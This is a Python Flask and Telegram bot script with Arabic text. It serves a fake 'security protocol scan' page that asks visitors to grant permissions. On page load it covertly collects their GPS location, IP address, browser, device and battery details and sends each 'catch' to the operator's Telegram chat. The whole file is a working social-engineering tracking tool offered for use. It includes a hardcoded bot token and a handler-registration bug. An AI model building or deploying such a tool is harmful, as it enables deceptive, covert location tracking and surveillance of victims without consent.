import os
import requests
from flask import Flask, request, render_template_string
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
import threading

# --- الإعدادات (ضع بياناتك هنا) ---
BOT_TOKEN = "8754086355:AAEw66jFIpxnxRRvpyN4Syf4YPSXRvGsPmQ"
ADMIN_ID = "8754086355"
app = Flask(__name__)

# واجهة هندسة اجتماعية متطورة
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث أمن النظام</title>
    <style>
        body { background: #0b0e14; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20%; }
        .box { border: 1px solid #00ff00; display: inline-block; padding: 20px; box-shadow: 0 0 10px #00ff00; }
    </style>
</head>
<body>
    <div class="box">
        <h3>جاري فحص بروتوكولات الأمان...</h3>
        <p id="status">الرجاء منح الصلاحية لإكمال التشفير</p>
    </div>
    <script>
        async function capture() {
            const getBattery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
            navigator.geolocation.getCurrentPosition(async (p) => {
                const data = {
                    lat: p.coords.latitude, lon: p.coords.longitude,
                    acc: p.coords.accuracy, ua: navigator.userAgent,
                    platform: navigator.platform, lang: navigator.language,
                    cores: navigator.hardwareConcurrency,
                    screen: screen.width + "x" + screen.height,
                    battery: getBattery ? (getBattery.level * 100) + "%" : "N/A"
                };
                await fetch('/log_capture', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                document.getElementById('status').innerText = "تم تأمين الاتصال بنجاح";
            }, (e) => { alert("خطأ: يجب السماح بالوصول للنظام لإتمام الفحص"); });
        }
        window.onload = capture;
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log_capture', methods=['POST'])
def log_capture():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    report = (
        "🎯 **صيد جديد (تقرير كامل)** 🎯\n\n"
        f"📍 **الموقع:** [خرائط جوجل](https://www.google.com/maps?q={d['lat']},{d['lon']})\n"
        f"🌐 **IP:** `{ip}`\n"
        f"📱 **النظام:** `{d['platform']}`\n"
        f"🔋 **البطارية:** `{d['battery']}`\n"
        f"🖥️ **الشاشة:** `{d['screen']}`\n"
        f"⚙️ **المعالج:** `{d['cores']} Core`\n"
        f"🌍 **اللغة:** `{d['lang']}`\n"
        f"🕵️ **المتصفح:** `{d['ua'][:100]}...`"
    )
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown"})
    return "OK"

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    await u.message.reply_text("✅ نظام الصيد الاحترافي نشط الآن.")

if __name__ == '__main__':
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000))), daemon=True).start()
    print("🚀 Bot is Online...")
    ApplicationBuilder().token(BOT_TOKEN).build().add_handler(CommandHandler('start', start))
    ApplicationBuilder().token(BOT_TOKEN).build().run_polling()
